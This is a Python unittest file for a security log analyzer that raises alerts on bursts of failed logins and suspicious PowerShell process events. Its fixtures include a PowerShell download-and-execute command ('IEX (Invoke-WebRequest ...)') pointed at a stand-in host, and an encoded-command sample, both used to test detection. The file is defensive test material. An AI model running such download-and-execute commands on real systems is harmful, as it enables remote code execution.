import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

PROJECT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT))

from analyzer import AnalysisConfig, Event, EventError, analyze, load_events


def event(key, second=0, *, host="lab-host", account="demo", kind="authentication_failed", **extra):
    payload = {
        "event_key": key,
        "timestamp": f"2026-01-01T00:{second // 60:02d}:{second % 60:02d}Z",
        "host": host, "account": account, "source": "linux_auth", "event_type": kind,
        "source_ip": "192.0.2.10",
    }
    payload.update(extra)
    return Event.from_dict(payload)


class CorrelationTests(unittest.TestCase):
    def test_out_of_order_input_uses_event_time_and_is_deterministic(self):
        events = [event(str(number), number * 10) for number in range(5)]
        forward = analyze(events)
        self.assertEqual(forward, analyze(reversed(events)))
        self.assertEqual(forward["summary"]["alert_count"], 1)
        self.assertEqual(forward["alerts"][0]["timestamp"], "2026-01-01T00:00:40.000Z")

    def test_host_and_account_groups_do_not_leak_counts(self):
        events = [event(f"a-{i}", i) for i in range(4)]
        events += [event("other-host", 5, host="lab-other"), event("other-account", 6, account="other")]
        self.assertEqual(analyze(events)["alerts"], [])

    def test_inclusive_window_and_expired_failure(self):
        events = [event("start", 0), event("boundary", 300)]
        self.assertEqual(len(analyze(events, AnalysisConfig(2, 300))["alerts"]), 1)
        events[-1] = event("expired", 301)
        self.assertEqual(analyze(events, AnalysisConfig(2, 300))["alerts"], [])

    def test_one_alert_for_dense_burst_then_rearm_after_gap(self):
        events = [event(f"first-{i}", i) for i in range(9)]
        events += [event(f"second-{i}", 600 + i) for i in range(5)]
        self.assertEqual(len(analyze(events)["alerts"]), 2)

    def test_success_does_not_erase_failed_authentication_evidence(self):
        events = [event(f"failure-{i}", i) for i in range(5)]
        events.append(event("success", 2, kind="authentication_success"))
        self.assertEqual(len(analyze(events)["alerts"]), 1)

    def test_allowlist_applies_only_to_authentication_failures(self):
        events = [event(f"failure-{i}", i) for i in range(5)]
        events.append(event("process", 6, kind="process_start", source="sysmon",
                            process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                            command_line="powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAA= "))
        report = analyze(events, AnalysisConfig(allowed_source_ips=frozenset({"192.0.2.10"})))
        self.assertEqual(report["summary"]["allowlisted_failure_events"], 5)
        self.assertEqual([a["rule"] for a in report["alerts"]], ["powershell_review"])

    def test_benign_powershell_is_not_alerted(self):
        process = event("benign", kind="process_start", source="sysmon", process_name="pwsh",
                        command_line="pwsh -NoProfile -Command Get-Service")
        self.assertEqual(analyze([process])["alerts"], [])

    def test_network_and_execution_combination_requires_review(self):
        process = event("suspicious", kind="process_start", source="sysmon", process_name="PowerShell.EXE",
                        command_line="powershell -Command \"IEX (Invoke-WebRequest https://example.invalid/lab).Content\"")
        alert = analyze([process])["alerts"][0]
        self.assertEqual(alert["severity"], "high")
        self.assertEqual(alert["disposition"], "requires_review")

    def test_encoded_text_in_other_process_does_not_trigger(self):
        process = event("other", kind="process_start", source="sysmon", process_name="echo",
                        command_line="echo -enc example")
        self.assertEqual(analyze([process])["alerts"], [])

    def test_timezone_offsets_are_normalized(self):
        first = event("first", timestamp="2026-01-01T03:00:00+03:00")
        second = event("second", 1)
        report = analyze([second, first], AnalysisConfig(2, 300))
        self.assertEqual(report["alerts"][0]["evidence"][0]["timestamp"], "2026-01-01T00:00:00.000Z")

    def test_config_rejects_invalid_thresholds(self):
        for values in [(1, 300), (5, 0), (True, 300)]:
            with self.subTest(values=values), self.assertRaises(ValueError):
                AnalysisConfig(*values)


class InputAndCliTests(unittest.TestCase):
    def test_invalid_lines_include_line_number(self):
        with self.assertRaisesRegex(EventError, "line 2"):
            load_events(io.StringIO("\n{broken json}\n"))

    def test_naive_time_rejected(self):
        with self.assertRaisesRegex(EventError, "timezone"):
            event("bad-time", timestamp="2026-01-01T00:00:00")

    def test_numeric_ip_is_not_silently_converted(self):
        with self.assertRaisesRegex(EventError, "IP address string"):
            event("bad-ip", source_ip=123)

    def test_duplicate_keys_rejected(self):
        payload = {"event_key": "same", "timestamp": "2026-01-01T00:00:00Z", "host": "lab",
                   "account": "demo", "source": "linux_auth", "event_type": "authentication_failed"}
        with self.assertRaisesRegex(EventError, "duplicate event_key"):
            load_events(io.StringIO(json.dumps(payload) + "\n" + json.dumps(payload)))

    def test_fixture_cli_matches_checked_in_report(self):
        result = subprocess.run([sys.executable, str(PROJECT / "run.py"), "--input", str(PROJECT / "data/events.jsonl")],
                                check=True, capture_output=True, text=True)
        report = json.loads(result.stdout)
        expected = json.loads((PROJECT / "examples/report.json").read_text(encoding="utf-8"))
        self.assertEqual(report, expected)
        self.assertEqual(report["summary"]["alert_count"], 5)

    def test_invalid_input_preserves_existing_report(self):
        with tempfile.TemporaryDirectory() as folder:
            input_path, output_path = Path(folder) / "invalid.jsonl", Path(folder) / "report.json"
            input_path.write_text("invalid\n", encoding="utf-8")
            output_path.write_text("keep existing report", encoding="utf-8")
            result = subprocess.run([sys.executable, str(PROJECT / "run.py"), "--input", str(input_path),
                                     "--output", str(output_path)], capture_output=True, text=True)
            self.assertEqual(result.returncode, 2)
            self.assertIn("line 1", result.stderr)
            self.assertEqual(output_path.read_text(encoding="utf-8"), "keep existing report")

    def test_input_cannot_be_overwritten_by_report(self):
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder) / "events.jsonl"
            original = (PROJECT / "data/events.jsonl").read_text(encoding="utf-8")
            path.write_text(original, encoding="utf-8")
            result = subprocess.run([sys.executable, str(PROJECT / "run.py"), "--input", str(path),
                                     "--output", str(path)], capture_output=True, text=True)
            self.assertEqual(result.returncode, 2)
            self.assertIn("different files", result.stderr)
            self.assertEqual(path.read_text(encoding="utf-8"), original)

    def test_linked_output_cannot_overwrite_input(self):
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder) / "events.jsonl"
            original = (PROJECT / "data/events.jsonl").read_text(encoding="utf-8")
            path.write_text(original, encoding="utf-8")
            for link_type in ("symlink", "hardlink"):
                with self.subTest(link_type=link_type):
                    linked = Path(folder) / f"{link_type}.json"
                    if link_type == "symlink":
                        linked.symlink_to(path)
                    else:
                        os.link(path, linked)
                    result = subprocess.run([sys.executable, str(PROJECT / "run.py"), "--input", str(path),
                                             "--output", str(linked)], capture_output=True, text=True)
                    self.assertEqual(result.returncode, 2)
                    self.assertIn("different files", result.stderr)
                    self.assertEqual(path.read_text(encoding="utf-8"), original)


if __name__ == "__main__":
    unittest.main()
